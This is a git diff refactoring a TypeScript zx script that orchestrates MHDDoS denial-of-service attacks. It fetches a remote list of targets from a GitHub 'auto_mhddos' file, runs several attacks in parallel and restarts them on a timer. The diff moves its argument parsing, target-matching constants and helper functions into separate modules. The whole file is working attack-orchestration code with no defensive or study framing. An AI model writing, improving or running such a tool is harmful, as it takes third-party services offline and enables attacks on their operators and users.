@@ -1,50 +1,13 @@
 import { $, argv, cd, chalk, fetch, nothrow, ProcessOutput, question, quiet } from 'zx';
+import { ACTIVE_NON_UDP_TARGETS_REGEX, ACTIVE_UDP_TARGETS_REGEX, TARGETS_URL } from './constants';
+import { parseArguments } from './parse-arguments';
+import { parseRestartInterval } from './parse-restart-interval';
+import { clamp } from './utils/clamp';
+import { parseFlags } from './utils/parse-flags';
 
 $.verbose = false;
 
-type Argv = typeof argv & {
-  /**
-   * Number of parallel attacks to run. Won't be less than 1 and more than the number of targets.
-   * If 'all' is passed, all the targets will be attacked simultaneously.
-   */
-  parallel: number | 'all';
-
-  /**
-   * Disables the upper limit of {@link parallel} and allows any number of attacks on the same target.
-   */
-  'disable-parallel-limit': boolean;
-
-  /**
-   * Interval in seconds for stopping running attacks, re-fetching targets and starting new attacks.
-   * Won't be less than 300 seconds (5 minutes).
-   */
-  'restart-interval': number;
-};
-
-type ShortArg = `-${string}=${string}`;
-type LongArg = `--${string}=${string}`;
-
-// ===== CONSTANTS
-
-const TARGETS_URL = 'https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets';
-const SECOND = 1;
-const MINUTE = SECOND * 60;
-const ACTIVE_UDP_TARGETS_REGEX = /^(?!#)(?=.*udp.*).+?$/gim;
-const ACTIVE_NON_UDP_TARGETS_REGEX = /^(?!#)(?!.*udp.*).+?$/gim;
-
-// ===== ARGUMENTS
-
-const {
-  _, // we don't need positional arguments
-  c, // we don't need custom targets
-  config, // we don't need custom targets
-  parallel = 1,
-  'disable-parallel-limit': disableParallelLimit = false,
-  'restart-interval': restartInterval = MINUTE * 30,
-  debug = true,
-  t = 1000,
-  ...mhddosArgs
-} = argv as Argv;
+const { parallel, disableParallelLimit, restartInterval, debug, t, ...mhddosArgs } = parseArguments(argv);
 
 if (disableParallelLimit) {
   console.log(
@@ -71,7 +34,7 @@ await startAttack();
 const intervalId = setInterval(async () => {
   await stopAttack();
   await startAttack();
-}, Math.max(MINUTE * 15, restartInterval) * 1000);
+}, parseRestartInterval(restartInterval));
 
 // properly handling Ctrl+C
 process.on('SIGINT', function () {
@@ -79,7 +42,7 @@ process.on('SIGINT', function () {
   process.exit();
 });
 
-// ===== UTILS
+// ===== FUNCTIONS
 
 async function startAttack(): Promise<void> {
   const targets = await getRandomTargets();
@@ -158,24 +121,10 @@ async function getTargetList(): Promise<string[]> {
   return [...new Set(targets)];
 }
 
-function parseFlags(args: Record<string, any>): Array<ShortArg | LongArg> {
-  return Object.entries(args).map(([key, value]): ShortArg | LongArg => {
-    return key.length === 1 ? `-${key}=${value}` : `--${key}=${value}`;
-  });
-}
-
 function computeParallel(targets: string[]): number {
   if (parallel === 'all') {
     return targets.length;
   }
 
-  return clamp({
-    value: parallel,
-    min: 1,
-    max: disableParallelLimit ? parallel : targets.length,
-  });
-}
-
-function clamp({ value, min, max }: { value: number; min: number; max: number }) {
-  return Math.max(min, Math.min(value, max));
+  return clamp(parallel, 1, disableParallelLimit ? parallel : targets.length);
 }
